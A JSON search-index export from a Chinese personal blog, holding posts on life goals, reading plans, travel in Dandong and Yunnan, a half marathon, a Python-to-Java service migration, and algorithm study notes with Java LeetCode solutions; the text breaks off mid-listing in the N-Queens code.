依赖倒置原则描述的是实现类之间不能直接发生依赖关系，其依赖关系是通过接口或者抽象类产生，即面向接口编程。实现类依赖接口或者抽象类，而接口或者抽象类不依赖实现类。 设计模式 https://design-patterns.readthedocs.io/zh_CN/latest/index.html","categories":[],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://noogel.xyz/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"我的 2019 年","slug":"关于生活/年/我的2019年","date":"2020-01-20T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2020/01/20/1.html","link":"","permalink":"https://noogel.xyz/2020/01/20/1.html","excerpt":"","text":"一些小的点 坚持阅读英文技术资料，并至少翻译12篇技术文章。x 戒掉熬夜的坏习惯，习惯性去健身，保持精力的充沛。60% 刻意提高专注力，并坚持系统性的做技术储备。80% 常出去走走，看看外面的世界，准备至少两次的远途旅行。100% 找到一个互相合适的伴侣。100% 趁年轻努力挣钱，但是不要透支身体。50% 好好学说话，做一个有趣的人。60% 主要方向 英语学习，坚持阅读英文技术资料，至少翻译12篇技术文章，基本的口语表达。x 沟通能力，说话前多思考，减少小动作的出现，改变不好的下意识动作和反应。50% 正确锻炼，学会并养成跑步习惯，无氧健身增加身体健壮。90% 发音练习《张浩翔 魅力声音必修课》预计学习时间 2 天，整理笔记，刻意练习。注意学习的几个阶段。 做到了哪些 考了救护员证 去了天津、昆明、大理、丹东 跑了马拉松 去山顶露营 第一个半马 云南之旅 丹东之旅 救护员证","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"2020知识储备计划","slug":"关于未来/2020知识储备计划","date":"2020-01-17T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2020/01/17/1.html","link":"","permalink":"https://noogel.xyz/2020/01/17/1.html","excerpt":"","text":"六本本职技术书籍&#x2F;专题 effective java done 01.29 Java 并发编程实战 done 02.14 深入理解 Java 虚拟机 part 04.01 Java 性能优化 21 讲 done 12.01 六本技术扩展书籍&#x2F;专题 图解密码技术 第三版 done 10.08 Linux 内核设计与实现（原书第三版） 现代编译原理 数据密集型应用系统设计 MySQL 实战 45 讲 part 08.26 Wireshark 数据包分析实战（第 3 版） done 2020.12.13 实现领域驱动设计 part 六本人文社科书籍 精进 done 02.11 我的改变：个人现代化 40 年 done 09.27 高效 PDCA 工作术 done 09.16 薄世宁医学通识讲义 done 10.20 这里是中国 done 10.05 活着 余华 done 12.10 论中国 基辛格 done 美国陷阱 done 整理输出两篇高质量博客文章","categories":[],"tags":[{"name":"书单","slug":"书单","permalink":"https://noogel.xyz/tags/%E4%B9%A6%E5%8D%95/"}]},{"title":"丹东之旅","slug":"关于生活/寻人不遇/丹东之旅","date":"2020-01-11T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2020/01/11/1.html","link":"","permalink":"https://noogel.xyz/2020/01/11/1.html","excerpt":"","text":"丹东是中国的一个边境小城市，在东三省的辽宁，与朝鲜隔鸭绿江相望。丹东春秋去会比较好，还有点景色可以看看，冬天的话来泡温泉吧，还可以顺便来一趟朝鲜游，带着护照来就好了。可惜的是因为一些原因无法泡温泉和去趟朝鲜。所以只是趁着年末逃离下北京，换个环境放松一下，其它的不重要了。 丹东是个有山有水有美食的地方，来这边可以沿着鸭绿江散步，好奇的望望对面神秘的社会主义同僚。去趟鸭绿江美术馆、抗美援朝纪念馆之类的地方看看当地的人文。鸭绿江断桥是一定要去的，走上去一点点感受下当年的气息和脚下的滚滚江水，一座见证历史的铁桥。丹东的🍓很出名，冬天来了可以尝尝，味道还是很甜的。还有当地著名的全州拌饭馆，超级好吃绝对不是吹的，还有有名参鸡汤，夜里的烧烤。。。想想又饿了。 这里的夜景也还不错，丹东这个城市挺小的，发展还不错，赶上季节好可以来这里吃海鲜~","categories":[],"tags":[{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"待整理文章列表","slug":"关于未来/待整理文章列表","date":"2020-01-01T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2020/01/01/1.html","link":"","permalink":"https://noogel.xyz/2020/01/01/1.html","excerpt":"","text":"待整理文章列表常用设计模式应用 缓存一致性问题分析 爬虫系统设计实践 高性能网络模型介绍 Java NIO 模型 时间轮算法详解 稀疏矩阵数据结构 零拷贝技术 MySQL 索引设计与使用 如何写好技术文章https://zhuanlan.zhihu.com/p/25720136 https://www.zhihu.com/question/22861247/answer/730177950 https://zhuanlan.zhihu.com/p/37133420","categories":[],"tags":[{"name":"计划","slug":"计划","permalink":"https://noogel.xyz/tags/%E8%AE%A1%E5%88%92/"}]},{"title":"第一个半马","slug":"关于生活/第一个半马","date":"2019-12-01T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2019/12/01/2.html","link":"","permalink":"https://noogel.xyz/2019/12/01/2.html","excerpt":"","text":"第一个半马…真的没啥挑战性，哈哈哈哈哈。 事情起源于表姐在群里问要不要去参加马拉松，她那有名额，然后就兴冲冲的报名了，报了个半马，然后开始了为期几个月的夜跑锻炼任务，从最初的慢悠悠的每天三公里，到逐步拔高的每次五公里，然后开始选鞋完善装备，提高到了十公里。因为家里有事中途中断了一些日子，之后就三天打鱼两天晒网的锻炼着，直到马拉松开始的那天。 周六早起动身，从北京出发到白洋淀站下车。迎着末夏的烈日，面对明天的半马，还是很兴奋的。都说出问题的都是跑半马的，因为半马大多是新手，不懂得如何把握自己身体和跑步强度，所以还是有点担心，就抱着玩玩看的心态去跑的。 半马路线图，从容城雄安市民服务中心出发一直跑到安新，全马则是跑到雄县。 第一个半马还算是比较轻松的跑过来了吧，期间粗心大意的没有把盐丸当回事，结果起跑就不力，心跳一直过速，直接影响了发挥，边跑变琢磨是怎么回事，后来觉得出汗多了，便找周围的人要了两粒盐丸，然后感觉心跳就慢慢的降到正常水平了。目标不高，完赛就好～，顺便拿起奖牌嘚瑟了一把。因为比赛在周日，担心第二天无法上班，其实多虑了，跑后做好充分的拉伸，第二天依然照常去上班了，腿也没有预期的酸痛，只是身体进行了一周左右的慢慢康复，身体的磨损在逐渐自我修复。 后面的时间可能不会再继续练跑步了，小区周围没有公园，只能在大街上跑，有比较多的尾气，感觉对身体不太好，然后买了辆山地准备以后骑行山间了。买后的一个周末独自骑行去了香山，前后 30 公里左右，感觉还不错，以后准备依赖这个了～","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"语言栈转型经验谈","slug":"关于技术/系统经验/语言栈转型经验谈","date":"2019-12-01T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2019/12/01/1.html","link":"","permalink":"https://noogel.xyz/2019/12/01/1.html","excerpt":"","text":"背景介绍 近一年都在做语言栈的转型，也注意到周围很多公司都在做相似的事情，大概的路径是 Python -&gt; Go -&gt; Java，转型的起因也是有诸多的因素，像 Python 这种开发速度快，执行相对慢的语言更适合中小型项目，加上国内语言生态不够成熟，项目做大了会发现大家一刀切的转到其它语言上，当然这些说的是在做 web 后端方向上，Python 在数据分析和人工智能方向上还是势头很猛的。Go 可能还是因为它能承载的并发更高，性能更好而逐渐流行起来。在并发模型上 Java 原生 API 使用上确实做得不好驾驭，Go 则要相对好用很多。还有在某些垂直领域上，Java 的生态已经很成熟，其它语言栈上则需要自己造轮子，相应对于开发人员的水平要求就会低很多了。 在当前互联网领域，后端研发做 web 主要谈的还是通过抽象和建模来提高项目的可迭代性与可维护性，另一方面谈的是工程实现上的优化和性能上的优化。在这些后面依赖的则是中台来保证的基础服务综合稳定性。 在语言栈转型中也踩过一些坑，遇到过一些小问题，当然这些也得益于一个相对靠谱的方案来保证迁移的安全，基于这些经验总结一下，在以后的迁移中使问题可预见和避免采坑。 转型流程首先要明确转型的三个开发流程 MRO (Migration, Reconstruction, Optimization) 迁移 就是把原语言代码照着抄一遍到新语言项目上，按照新语言的工程实现风格来做就可以。 重构 的目的是来提高项目代码的可维护性和可迭代性，让代码更加优雅和好读懂，可以放到迁移完成来做。 优化 则可以是在模块依赖、调用关系、接口字段等方面调整来降低项目的复杂性和提高合理性。 然后看我们人力和时间是否充足，我想大部分情况下是不充足的，按照最短时间交付的原则，我们应该只做迁移流程，也就是说先对原有代码进行语言上的迁移，这样我们可以快速实现交付。在人力充沛的情况下可以配备两个小组，一个维护现有系统，一个主力开发新系统，或者说锁定需求全力开发新系统。在对快速交付更看中的行业里前一个方案更合适一些。 交付流程在交付过程中的验证流程 单测验证 -&gt; 测试环境功能验证 -&gt; QA生产回测 -&gt; 灰度验证 -&gt; 完全上线。只有功能和单测代码都迁移完才能算代码部分完成，需要优先保证单测行数覆盖率再去保证分支覆盖率，测试环境的功能验证需要覆盖所有 case 来保证大部分问题都被发现，然后进入小范围的灰度验证，之后逐步提高灰度比率直至完全上线。如果是纯读接口则可以直接进行异步校验，就是请求两遍，然后对比差异来不断的发现和修复 bug，直至问题收敛完全解决。如果明确只做迁移，那么期间如果有发现旧逻辑的 bug 也不要管，这样才好去对比验证，验证通过上线后再去修复。只有通过明确目的和流程并且遵循这个流程做，才能更快的去交付。 验证方案 针对新代码的验证方案分为别为读写接口做不同的验证方案： 读接口：异步请求到新接口做接口响应值校验，打印出差异数据，然后不断修正逻辑。这样可以避免在线上灰度造成数据的不一致。 写接口：测试用例覆盖，然后测试环境验证，灰度回测，灰度验证，修复问题，继续灰度验证。 平稳交付在整个交付的过程中，转型前后对 SLA 要提供一致的保证，可以看看下面的几个衡量标准： 服务可用性级别 服务正常运行时间 年宕机时间 日宕机时间 1 90% 36.5day 2.4hour 2 99% 3.65day 14min 3 99.9% 8.76hour 86sec 4 99.99% 52.6min 8.6sec 5 99.999% 5.26min 0.86sec 6 99.9999% 31.5sec 8.6msec 在线 MD 表格生成 一般 3 个 9 的可用性全年宕机时间约为 8.76 小时，针对不同系统不同用户规模对于系统可用性的要求不一样，边缘业务的要求可能会低一些，但是对于核心支付链路场景 TPS 可能不高，但是必须要求保证高可用级别。如何保证或者提升服务的 SLA 是我们接下来要探讨的目标，一般有下面两个影响因素： MTBF (Mean Time Between Failures) 系统服务平均故障时间间隔 MTTR (Mean Time To Recover) 系统服务平均故障恢复时长 也就是说我们系统要尽可能的降低故障频率以及出现故障时能尽快的恢复。基于这两点我们在做系统平稳过渡时，要充分测试所有 case ，并且进行内部灰度方案和异步重试对比，发现异常立即回滚查找结局问题后再重新灰度。这里需要做到一键开关，数据可监控和追溯。 持续监控，感知系统稳定性的第一步就是监控，通过监控和系统日志来排查问题和及时响应处理。监控有两个层面，一个是基础设施提供的机器监控以及接口级别的响应稳定性监控，另一个是业务数据层面的多维度监控。系统日志按照等级大致分为 INFO 日志以及 ERROR 日志。 快速交付关于快速交付，可以了解 下敏捷开发，及早和持续不断的交付有价值的软件。关于 Scrum 开发的介绍可以看： 什么是敏捷 现状及未来 基于公司现状考虑 nginx 不支持长时间和自定义灰度，所以 http 接口层没做改动，只是在内部逻辑上通过 rpc 服务转到新的系统中。基于以上要点可以做到功能的快速交付。截止此文撰写时间，语言栈转型已经将系统核心接口逻辑 100% 迁移到新的系统上，对于日常系统需求已经可以做到在新系统开发和接入了。后面要做的有以下几点： 将系统外围逻辑迁移到新系统； 不断监控降噪，细化监控粒度，继续提高服务的稳定性； 当前对于Python的花式“魔法” 硬翻译还需要不断重构和优化。 完善监控大盘，通过数据驱动来运营优化我们的流程； 项目复盘总结以及业务普及宣讲，提升人员对于业务细节的认知。 转型痛点迁移后再做重构和优化过程。在迁移过程中有一个痛点是新需求过来了，要么锁定需求只做迁移，要么写两遍。基于人力情况可以选择一个小组同时写新旧系统或者一个小组维护新的一个小组维护旧的。在转型过程中新需求过来有时要写两边，或者要把旧系统流量打到新系统接口上，常常在排查问题时遇到流量忘记转移的情况，所以在迁移过程要尽可能的快速交付上线。 反思 对于每一位工程师来说语言栈的转型既是挑战也是机遇，只有保持开放学习心态，及时调整和提升才能更好应对，同时增强自身软素质。 当前互联网环境下分布式是必经之地，而系统绝非 100% 可靠，每一个环节可能的异常在上线后必定遇到，所以针对不同场景我们要在 AP 与 CP 之间做出选择。 对于支付交易核心链路，一条柱子肯定是不稳的，双链路也未必可靠，但至少更稳一些。曾经遇到过相隔几公里的两条光纤被施工队挖断的情况，双机房访问直接 gg 了，但总归是少见的。 提系统可用性要避免出问题，除了问题要快快快速响应恢复，有问题先回滚。","categories":[],"tags":[{"name":"编程语言","slug":"编程语言","permalink":"https://noogel.xyz/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"}]},{"title":"云南之旅","slug":"关于生活/寻人不遇/云南之旅","date":"2019-11-30T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2019/11/30/1.html","link":"","permalink":"https://noogel.xyz/2019/11/30/1.html","excerpt":"","text":"多图预警！！！多图预警！！！多图预警！！！多图预警！！！ 云南是一个离家好几千公里的地方。最初要去的想法是在一次同学聚会上大家商量的，结果到了十月一只有们两个人过来玩了，倒也好，制定行程和订票比较省事。于是，参加完同学婚礼就开始了我们的云南之旅，从国际庄直飞昆明。 去之前做攻略的时候并没有觉得昆明有什么好玩的地方，所以只是做了一天半的行程，要说昆明吃的地方也就是鲜花饼和米线了。对比过几家不同的，一个是花多纷的鲜花饼，另一个是建新园的米线不错。 玩的地方是真没觉得什么，然后就是去了云南省博物馆看了看，一般我到一个城市会先去了解下这个城市的历史和人文，博物馆建的是很恢弘有气势。看了看滇人、昆明人和汉人之间的历史渊源。 明明天还很早，博物馆就早早往外赶人了，算是逛了一半吧，然后看旁边有个官渡古镇，便抱着试试看的心态去逛了逛，果然跟预料的一样，纯粹的商业化街道让人不会再来第二次，就像北方的太行水镇、古北水镇，北京的王府井小吃街和天津的古文化街。。。 也许第一天太兴奋了吧，晚上不想回去，这边比北京在地理时区上差一个多小时。然后便跑去了云大看妹子，可惜到了都晚上了（😶），有大学地方就有小吃街，果然不出所料。 在昆明的第二天，睡了个懒觉，下午去的海埂公园看的滇池。不得不说，景色是真的不错，空气也很好，来到这里就是一场洗肺之旅。 海埂公园是从南到北的，可以遥望西山，走着走着不知不觉就想着去西山看看，站在山顶来俯瞰滇池和昆明应该很不错。就这样被什么驱使着，拿着地图导航，顺着一个不知名的小路就上⛰了。还真是曲径通幽处，好多次都给走错路了，因为真的挺偏。 山中刚下过雨路有点滑，望着遮住天空的树也不知道累，总归心情是很好的，空气也很好，想到这里总对比起北京令人头疼的雾霾天，天高皇帝远，有点不想回去了，在这种地方真的挺宜居的。 想看到的总归是要看到的，但不是在山顶，而是在爬山的某条路途中。 最后，爬到山顶是不能了，来的有点晚，得趁着天黑前下山回去，结果顺着某德导航走了一条崎岖山路，纯人工走出来的土路，崎岖泥泞，向前看不见头，向后难以攀爬。。。有点绝望了，真不知道这种路怎么会被收录并作为导航路线。。。大概是下图这样子的，真的是手脚并用出来的，最口看到村口灯光的时候特别的激动，是看到希望的激动😂。 已经很晚了，到了有人的地方赶紧打车回去市里找了个吃饭的地方。傣族风味，看评价还是挺地道的，发现和其它吃过的才来说，做法上好像没有太特别的地方，只是这里的都加了好多特别香味的香草。 要去的地方总归要去的，一个号称风花雪月的地方——大理，但是我要说与我和我的小伙伴无关。虽然我没有被过多的安利大理的美，但也还是抱着去放松的心态走一趟的。 后面几天的行程比较集中，便商量租了辆车，两个新手，开启了试车模式，尤其我这个拿本六年没摸过车的纯新手，还是比较紧张和激动的。。。我们开上了苍山，到过洱海，去过古镇（(⊙o⊙)…好像哪里不对），先练了半天车。 开过了洱海边的乡间小路、白族人的原始村镇，看到了一片金黄的稻田，如此没见过世面的我自己都很惊讶。。。 站在洱海边遥望苍山，哪些传说的爱情故事也只是传说，我所切实感受到的是景色真的很棒，随手一拍都是能做壁纸的那种。我想和对象一起来的话，住着海景房也是会很浪漫的吧？？？ 待在这样的环境里我想一辈子也不会厌倦吧。晚上开去大理古城吃饭，石井私房菜，一个小巷子里，菜品也不错。邻桌的也是从北京过来旅游的。 也许大理的爱情偶遇会在古城中一个故事里发生，在不经意之间吧。 开车就要到平时不能到的地方去看看，经过重重山路不经意间来到了赵灵儿的故乡。查了查发现这里是南诏文化，巍山自治县，这里也有一个古城，慢悠悠的古城里有着原始的居民，又没有太过浓厚的商业化，保护的还相对比较好。 来大理的第三天，想着去丽江看看，最后因为时间距离问题没去，二刷再说吧。那么之前在洱海西线走了一遍，今天就在东线的环海公路走一遍吧。来到了一个叫双廊古镇的浓浓商业化的地方，有着网红打卡地天空之境，随处可见的海景房，这些都不重要，重要的是回去路上沿海公路，听着小歌吹着海风，心情超级好。当然还要感谢一下驾驶员智哥~ 出来玩还是不要太久的，容易疲惫，好时光总是很快的，回家啦~ 走啦～ 参考攻略 云南游玩交通参考 大理景点分布 行程规划 预算","categories":[],"tags":[{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"数据结构与算法思想","slug":"关于技术/数据结构与算法思想/数据结构与算法思想","date":"2019-08-29T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2019/08/29/2.html","link":"","permalink":"https://noogel.xyz/2019/08/29/2.html","excerpt":"","text":"人生只有贪心，没有动态规划。 数据结构 数组 栈，先进后出 队列，先进先出 双端队列，双端队列中的元素可以从两端弹出，插入和删除操作限定在队列的两边进行。 环形队列，环形队列是一种特殊的队列结构，保证了元素也是先进先出的，但与一般队列的区别是，他们是环形的，即队列头部的上个元素是队列尾部，通常是容纳元素数固定的一个闭环。 堆，一种特别的树状数据结构。堆总是一棵完全树。即除了最底层，其他层的节点都被元素填满，且最底层尽可能地从左到右填入。 链表 单向链表。 双向链表。 跳表，一种带多级索引的链表。 散列表，是根据键而直接访问在内存存储位置的数据结构。它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。 树 二叉树，二叉树是一个连通的无环图，并且每一个顶点的度不大于3。 红黑树，是一种自平衡二叉查找树。 字典树（Trie） 图，图（Graph）是由顶点的有穷非空集合和顶点之间的边的集合组成。 https://zhuanlan.zhihu.com/p/25498681 TODO 布隆过滤器，一个概率型数据结构，可以用来判断一个元素是否在一个集合中。判断某个元素在，可能会被误判；判断某个元素不在，那么一定不在。 https://juejin.im/post/5bc7446e5188255c791b3360 算法思想分治法分治法是基于多项分支递归的一种很重要的算法范式。字面上的解释是“分而治之”，就是把一个复杂的问题分成两个或更多的相同或相似的子问题，直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。 例子：快排、归并排序、MapReduce 贪心算法贪心算法就是在每一步的选择中都按照当前最优的选择，从而希望最终结果得到最优解。贪心算法在有最优子结构的问题中尤为有效。最优子结构的意思是局部最优解能决定全局最优解。简单地说，问题能够分解成子问题来解决，子问题的最优解能递推到最终问题的最优解。贪心算法与动态规划的不同在于它对每个子问题的解决方案都做出选择，不能回退。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，有回退功能。 例子：最小生成树、哈夫曼编码 动态规划（Dynamic Programming）动态规划通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。常常适用于有重叠子问题和最优子结构性质的问题。若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。通常许多子问题非常相似，为此动态规划法试图仅仅解决每个子问题一次，从而减少计算量：一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。这种做法在重复子问题的数目关于输入的规模呈指数增长时特别有用。 递归+记忆&#x3D;递推 适用情况： 具有最优子结构性质。 无后效性，子问题确定后不会再改变。 子问题重叠的性质。 例子：背包问题https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92https://www.zhihu.com/question/23995189/answer/613096905 回溯法（backtracking）回溯法采用试错的思想，它尝试分步的去解决一个问题。在分步解决问题的过程中，当它通过尝试发现现有的分步答案不能得到有效的正确的解答的时候，它将取消上一步甚至是上几步的计算，再通过其它的可能的分步解答再次尝试寻找问题的答案。回溯法通常用最简单的递归方法来实现，在反复重复上述的步骤后可能出现两种情况： 找到一个可能存在的正确的答案 在尝试了所有可能的分步方法后宣告该问题没有答案 在最坏的情况下，回溯法会导致一次复杂度为指数时间的计算。 例子：八皇后问题 https://zh.wikipedia.org/wiki/%E5%9B%9E%E6%BA%AF%E6%B3%95https://www.cnblogs.com/zuzZ/p/8178950.html 分支界限法与贪婪算法一样，这种方法也是用来为组合优化问题设计求解算法的，所不同的是它在问题的整个可能解空间搜索，所设计出来的算法虽其时间复杂度比贪婪算法高，但它的优点是与穷举法类似，都能保证求出问题的最佳解，而且这种方法不是盲目的穷举搜索，而是在搜索过程中通过限界，可以中途停止对某些不可能得到最优解的子空间进一步搜索（类似于人工智能中的剪枝），故它比穷举法效率更高。 概率算法例子：数值随机化算法蒙特卡罗(Monte Carlo)算法拉斯维加斯(Las Vegas)算法舍伍德(Sherwood)算法 https://zhuanlan.zhihu.com/p/42619498 练习题15. 三数之和题目给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。 注意：答案中不可以包含重复的三元组。 例如, 给定数组 nums &#x3D; [-1, 0, 1, 2, -1, -4]， 满足要求的三元组集合为：[ [-1, 0, 1], [-1, -1, 2]] 解题思路初读这道题时忽略了一个点，就是在检查时，如果有两个重复的数字可以都用上组成一个三元组集合，但是在返回结果的时候不能第一个数字参与组成三元组后第二个相同数字继续组成三元组。① 有三种思路，先进性排序处理，然后再进行处理。第一种就是做三层枚举；第二种就是两层枚举，在进行 set O(1) 查找；第三种是一层枚举，然后从剩余列表中的左右两边进行查找，满足三元组的添加记录。 下面是主要介绍第三种思路的细节 ②： 排序处理 从第 0 位置开始遍历 分别取剩余数组的首尾值进行求和 如果大于零则向前移动尾部游标 如果小于零则向后移动头部游标 如果等于零则添加记录 添加记录后对首尾游标向中间移动一格 如果首尾游标没有相交则继续 2.1 步骤处理 进行下一位置的遍历，直到数组尾部 返回结果 整个流程思路基本是这样子的，然后我们对于边界情况的处理单独进行描述 ③ 如果当前遍历位置值大于 0 则直接返回结果 对于我在 ① 中描述的情况，需要在 2.1 之前进行与判断，当前位置与上一位置值相同则跳过，进行排重处理 同样的情况处理在 4.1 之后也要进行首尾游标移动方向相邻值的排重处理 解题思维 首先需要做到的是充分理解题意，至少要做到能肉眼推导正确结果。 解决方案一般都会有多种，合理选择最优方案进行骨架设计 ②，充分考虑时间和空间复杂度。 然后解决边界条件 ③，优化代码可读性。 充分进行测试验证算法的正确性。 解题代码最后放一下解题代码，也是参考别人的方案实现的： 1234567891011121314151617181920212223242526272829import java.util.*;public class ThreeSum &#123; public static List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; resp = new ArrayList&lt;&gt;(); Arrays.sort(nums); for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] &gt; 0) break; int l = i + 1; int r = nums.length - 1; if (i &gt; 0 &amp;&amp; nums[i-1] == nums[i]) continue; while (l &lt; r)&#123; int sum = nums[i] + nums[l] + nums[r]; if ( sum&gt; 0) r--; else if (sum &lt; 0) l++; else if (sum == 0)&#123; resp.add(Arrays.asList(nums[i], nums[l] , nums[r])); while (l &lt; r &amp;&amp; nums[l] == nums[l+1]) l++; while (l &lt; r &amp;&amp; nums[r] == nums[r-1]) r--; l++; r--; &#125; &#125; &#125; return resp; &#125;&#125; 22. 括号生成题目给出 n 代表生成括号的对数，请你写出一个函数，使其能够生成所有可能的并且有效的括号组合。 例如，给出 n &#x3D; 3，生成结果为： 123456789101112[---title: 51. N皇后date: 2019-08-20tags: [算法, leetcode]id: 1--- &quot;((()))&quot;, &quot;(()())&quot;, &quot;(())()&quot;, &quot;()(())&quot;, &quot;()()()&quot;] 思路根据递归做暴力处理，同时进行剪枝操作。 解答123456789101112131415161718192021222324252627282930import java.util.ArrayList;import java.util.List;public class GenerateParenthesis &#123; public static void main(String[] args) &#123; GenerateParenthesis obj = new GenerateParenthesis(); List&lt;String&gt; stringList = obj.generateParenthesis(3); System.out.println(stringList); &#125; public List&lt;String&gt; generateParenthesis(int n) &#123; List&lt;String&gt; collect = new ArrayList&lt;&gt;(); gen(collect, &quot;&quot;, n, n); return collect; &#125; public void gen(List&lt;String&gt; collect, String cur, int left, int right) &#123; if (left == 0 &amp;&amp; right == 0) &#123; collect.add(cur); return; &#125; if (left &gt; 0) &#123; gen(collect, cur + &quot;(&quot;, left - 1, right); &#125; if (right &gt; 0 &amp;&amp; right &gt; left) &#123; gen(collect, cur + &quot;)&quot;, left, right - 1); &#125; &#125;&#125; 49、242. 字母异位词第一题： 242. 有效的字母异位词给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。 示例 1: 输入: s &#x3D; “anagram”, t &#x3D; “nagaram”输出: true示例 2: 输入: s &#x3D; “rat”, t &#x3D; “car”输出: false 说明:你可以假设字符串只包含小写字母。 解答第一个思路是使用 HashMap 进行字频统计再对比，第二个思路是字符串排序后进行比较。 第二题： 49. 字母异位词分组 给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。 示例: 输入: [“eat”, “tea”, “tan”, “ate”, “nat”, “bat”],输出:[ [“ate”,”eat”,”tea”], [“nat”,”tan”], [“bat”]]说明： 所有输入均为小写字母。不考虑答案输出的顺序。 练习输出： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import java.util.*;public class Anagram &#123; public static void main(String[] args) &#123; System.out.println(isAnagram(&quot;anagram&quot;, &quot;nagaram&quot;)); System.out.println(isAnagram2(&quot;anagram&quot;, &quot;nagaram&quot;)); groupAnagrams(new String[]&#123;&quot;eat&quot;, &quot;ate&quot;, &quot;aaa&quot;&#125;); &#125; public static boolean isAnagram(String s, String t) &#123; if (null == s &amp;&amp; null == t) &#123; return true; &#125; else if (null == s || null == t) &#123; return false; &#125; else if (s.length() != t.length()) &#123; return false; &#125; Map&lt;Character, Integer&gt; left = new HashMap&lt;&gt;(); Map&lt;Character, Integer&gt; right = new HashMap&lt;&gt;(); for (int i = 0; i &lt; s.length(); i++) &#123; left.put(s.charAt(i), left.getOrDefault(s.charAt(i), 0) + 1); &#125; for (int j = 0; j &lt; t.length(); j++) &#123; right.put(t.charAt(j), right.getOrDefault(t.charAt(j), 0) + 1); &#125; for (Map.Entry&lt;Character, Integer&gt; c : left.entrySet()) &#123; if (!c.getValue().equals(right.getOrDefault(c.getKey(), 0))) &#123; return false; &#125; &#125; return true; &#125; public static boolean isAnagram2(String s, String t) &#123; if (null == s &amp;&amp; null == t) &#123; return true; &#125; else if (null == s || null == t) &#123; return false; &#125; else if (s.length() != t.length()) &#123; return false; &#125; char[] left = s.toCharArray(); char[] right = t.toCharArray(); Arrays.sort(left); Arrays.sort(right); for (int i = 0; i &lt; left.length; i++) &#123; if (left[i] != right[i]) &#123; return false; &#125; &#125; return true; &#125; public static List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; Map&lt;String, List&lt;String&gt;&gt; res = new HashMap&lt;&gt;(); for (String sr : strs) &#123; char[] chars = sr.toCharArray(); Arrays.sort(chars); String sortedSr = new String(chars); if (!res.containsKey(sortedSr)) &#123; res.put(sortedSr, new ArrayList&lt;&gt;()); &#125; List&lt;String&gt; mapVal = res.get(sortedSr); mapVal.add(sr); &#125; List&lt;List&lt;String&gt;&gt; rep = new ArrayList&lt;&gt;(); for (Map.Entry&lt;String, List&lt;String&gt;&gt; entry : res.entrySet()) &#123; rep.add(entry.getValue()); &#125; return rep; &#125;&#125; 51. N皇后题目n 皇后问题研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 上图为 8 皇后问题的一种解法。 给定一个整数 n，返回所有不同的 n 皇后问题的解决方案。 每一种解法包含一个明确的 n 皇后问题的棋子放置方案，该方案中 ‘Q’ 和 ‘.’ 分别代表了皇后和空位。 示例: 12345678910111213输入: 4输出: [ [&quot;.Q..&quot;, // 解法 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // 解法 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]]解释: 4 皇后问题存在两个不同的解法。 思路… 解题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import java.util.ArrayList;import java.util.HashSet;import java.util.List;import java.util.Set;public class SolveNQueens &#123; public static void main(String[] args) &#123; SolveNQueens queens = new SolveNQueens(); System.out.println(queens.solveNQueens(5)); &#125; public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; List&lt;List&lt;String&gt;&gt; resp = new ArrayList&lt;&gt;(); Set&lt;Integer&gt; cols = new HashSet&lt;&gt;(); Set&lt;Integer&gt; pie = new HashSet&lt;&gt;(); Set&lt;Integer&gt; na = new HashSet&lt;&gt;(); dfs(n, 0, new ArrayList&lt;&gt;(), resp, cols, pie, na); return resp; &#125; public void dfs(int max, int row, List&lt;String&gt; curState, List&lt;List&lt;String&gt;&gt; resp, Set&lt;Integer&gt; cols, Set&lt;Integer&gt; pie, Set&lt;Integer&gt; na) &#123; // 终结条件 if (row &gt;= max) &#123; if (curState.size() == max) &#123; resp.add(curState); &#125; return; &#125; // 循环列 for (int col = 0; col &lt; max; col++) &#123; if (cols.contains(col) || pie.contains(row + col) || na.contains(row - col)) &#123; continue; &#125; cols.add(col); pie.add(row + col); na.add(row - col); curState.add(trans(col, 